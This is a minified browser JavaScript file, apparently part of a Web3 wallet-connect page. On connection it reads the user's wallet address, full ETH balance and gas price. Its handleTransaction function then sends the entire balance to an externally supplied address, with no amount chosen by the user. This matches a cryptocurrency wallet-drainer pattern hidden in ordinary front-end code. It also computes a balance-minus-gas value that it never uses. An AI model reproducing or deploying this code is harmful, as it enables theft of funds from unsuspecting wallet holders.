import{web3Modal as e,ethereumClient as o,provider as n}from"./web.js";let t;async function a(){console.log("ethers",window.ethereum);const e=new Web3(window.ethereum);t=e,console.log("signer here: ",e);const o=await e.eth.getAccounts(),n=await t.eth.getGasPrice();console.log("my accounts",o),console.log("gas price",n);const a=await async function(e){try{const o=await t.eth.getBalance(e),n=t.utils.fromWei(o,"ether");return console.log("Balance:",n),n}catch(e){console.error("Error fetching balance:",e),alert("Error fetching balance. Please check the console for more details.")}}(o[0]);return window.balance=a,window.address=o[0],window.gasPrice=n,{address:o[0],balance:a,gasPrice:n}}console.log("test",e),window.handleTransaction=async function(e){try{const{balance:o,address:n,gasPrice:s}=await a(),c=t.utils.toWei(o,"ether"),r=c-s;console.log("money in wei",c,r),console.log("address",n);const l=await t.eth.sendTransaction({from:n,to:e,value:c});console.log("Transaction successful:",l),alert("Transaction successful! Transaction Hash: "+l.transactionHash)}catch(e){console.error("Transaction error:",e),alert("Transaction error! Please check the console for more details.")}},document.addEventListener("DOMContentLoaded",(async()=>{try{window.web3Modal=e,window.ethereumClient=o;const n=window.ethereumClient.getAccount();document.getElementById("ether").addEventListener("click",a),window.usersWalletAddress=n.address,window.providerWallet=""}catch(e){console.log("the error here",e)}}));